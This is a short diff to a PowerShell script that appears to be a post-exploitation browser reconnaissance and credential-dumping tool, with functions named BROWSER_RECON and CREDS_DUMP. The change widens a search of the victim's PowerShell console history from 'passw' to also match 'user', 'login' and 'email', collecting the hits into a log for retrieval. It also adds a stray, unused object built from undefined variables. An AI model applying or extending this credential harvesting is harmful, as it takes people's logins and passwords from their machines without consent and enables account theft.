@@ -140,6 +140,13 @@ function BROWSER_RECON {
         $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
     }
 
+
+    $test = [PSCustomObject] @{
+        Name = $name
+        Location = $location
+        Age = [int] $age
+    }
+
     ## Build Table to display results found
     echo "`n`nBrowser    Status    Version         PreDefined" > $LogFilePath\BrowserEnum.log
     echo "-------    ------    -------         ----------" >> $LogFilePath\BrowserEnum.log
@@ -575,7 +582,7 @@ function CREDS_DUMP {
         echo "ConsoleHost_history.txt not found .." >> $LogFilePath\BrowserEnum.log
     }else{
         $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
-        $Json = Get-Content "$Path"|sls passw
+        $Json = Get-Content "$Path"|sls -pattern "passw","user","login","email"
         If(-not($Json) -or $Json -eq $null){
             echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
         }else{
@@ -603,7 +610,7 @@ If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}
 #         Data = $Key
 #     } 
 # }
-# Write-Host "$StoreData"|Out-File "$env:tmp\report.log"
+# Write-Host $StoreData|Out-File "$env:tmp\report.log"
 
 ## Retrieve Remote Info from LogFile
 Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
